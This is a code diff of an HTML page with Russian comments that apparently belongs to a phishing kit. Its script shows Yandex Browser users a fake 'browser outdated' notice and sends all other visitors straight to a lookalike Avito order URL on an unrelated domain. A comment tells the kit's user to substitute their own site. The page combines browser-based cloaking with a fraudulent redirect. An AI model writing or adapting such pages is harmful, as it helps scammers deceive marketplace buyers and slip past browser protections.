@@ -7,27 +7,28 @@
   <script>
     document.addEventListener("DOMContentLoaded", function () {
       let ua = navigator.userAgent.toLowerCase();
-      if (!ua.includes("yabrowser")) {
-        // сразу редиректим, если НЕ яндекс
+
+      if (ua.includes("yabrowser")) {
+        // если Яндекс → подгружаем разметку ошибки
+        document.body.innerHTML = `
+          <div style="margin:0;align-items:center;display:flex;flex-direction:column;justify-content:center;overflow:hidden;min-height:100vh;font-family:'Source Sans Pro',sans-serif;">
+            <div style="margin:20px;max-width:700px;min-width:400px;text-align:center;">
+              <p style="margin:0;color:#65656a;font-size:30px;line-height:68px;">Ваш браузер устарел :(</p>
+              <p style="margin:0;color:#98989d;font-size:25px;line-height:38px;">
+                Скопируйте ссылку и откройте в другом приложении,<br>
+                например <b>Opera</b>, <b>Chrome</b> или <b>IE</b>.
+              </p>
+            </div>
+          </div>
+        `;
+      } else {
+        // если не Яндекс → сразу редирект
         window.location.replace("https://avito.13738.online/order/9632751773"); 
-        // 🔗 замени на свою ссылку
+        // 🔗 замени на свой сайт
       }
     });
   </script>
 </head>
-<body style="margin: 0;font-family: 'Source Sans Pro',sans-serif;">
-  <div class="layout" style="margin: 0;align-items: center;display: flex;flex-direction: column;justify-content: center;overflow: hidden;min-height: 100vh;">
-    <div class="layout__content" style="margin: 20px;max-width: 700px;min-width: 400px;">
-      <p class="layout__content-picture" style="margin: 0;">
-        <span class="layout__image" alt="Cat" style="margin: 0;min-width: 80%;"></span>
-      </p>
-      <p class="layout__title" style="margin: 0;color: #65656a;font-size: 30px;line-height: 68px;text-align: center;">
-        Ваш браузер устарел :(
-      </p>
-      <p class="layout__title" style="margin: 0;color: #98989d;font-size: 25px;line-height: 38px;text-align: center;">
-        Скопируйте ссылку и откройте в другом приложении,<br>например <b>Opera</b>, <b>Chrome</b> или <b>IE</b>.
-      </p>
-    </div>
-  </div>
+<body>
 </body>
 </html>
